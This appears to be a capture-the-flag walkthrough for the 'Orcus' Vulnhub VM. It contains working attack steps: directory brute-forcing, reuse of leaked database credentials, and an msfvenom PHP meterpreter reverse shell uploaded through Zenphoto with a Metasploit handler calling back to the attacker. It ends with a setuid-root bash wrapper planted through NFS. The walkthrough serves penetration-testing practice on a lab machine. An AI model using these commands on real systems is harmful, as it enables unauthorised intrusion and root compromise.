# [VMHacking] Orcus - Hackfest 2016

[HackingArticle link](http://www.hackingarticles.in/hack-orcus-vm-ctf-challenge/)
[VM Download](https://www.vulnhub.com/entry/hackfest2016-orcus,182/)



</br>



## Discover target IP

```
$ nmap -sn 192.168.0.1/24
```



</br>



## Web root bruteforcing

```sh
tty1$ dirb http://192.168.0.34
tty2$ dirb http://192.168.0.33 /usr/share/wordlists/dirb/big.txt
```

* `/backups` :

  * Finding SimpleQUIZPHP.tar

  * Finding inside db_conn.php

    ```
    DB_USER : dbuser
    DB_PASSWORD : dbpassword
    ```

* `/phpmyadmin` :

  * Login as dbuser:dbpassword
  * Finding zenphoto database



</br>



## Zenphoto: Installation not completed

- Go to http://192.168.0.34/zenphoto
- Add database credential to complete configuration before installation
- Finish install and **set admin credential**



</br>



## Zenphoto: Upload php meterpreter

- Go to `Upload -> Image (http)` 
- Generate exploit.php

```sh
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.25 LPORT=4444 â€“f raw
# Past php code on file exploit.php
$ zip exploit.zip exploit.php
# Upload the exploit.zip file on zenphoto
```



</br>



## Zenphoto: Handle meterpreter

```sh
$ msfconsole

msf > use exploit/multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.0.25
lhost => 192.168.0.25
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 192.168.0.25:4444
[*] Starting the payload handler...
[*] Sending stage (34599 bytes) to 192.168.0.34
...
# Go to http://192.168.0.34/zenphoto/albums/<name provide>/exploit.php
...
[*] Meterpreter session 1 opened (192.168.0.25:4444 -> 192.168.0.34:34092) at 2017-06-26 02:22:41 +0200

meterpreter >
```



</br>



## Zenphoto: Passing root with an exploit.c & NFS

- On your system create a C code

```sh
$ emacs exploit.c
int main() {
  setresuid(0, 0, 0);
  system("/bin/bash");
}
# save
```

- Push on target

```sh
meterpreter > cd /tmp
meterpreter > upload /Panda/Hacking/exploit.c
meterpreter > shell
meterpreter > gcc exploit.c -o exploit
# You need to change the owner of the exploit as 'root'
```

- Mount the remote `/tmp`  on your machine

```sh
$ mount_nfs -o resvport 192.168.0.34:/tmp /tmp/target
$ chown root:wheel exploit
$ chmod u+s exploit
```

- Become `root` 

```sh
meterpreter > cd /tmp
meterpreter > ./exploit
meterpreter > cd /root
meterpreter > whoami
root
meterpreter > cat flag.txt
# YOU HAVE PWN ORCUS
```

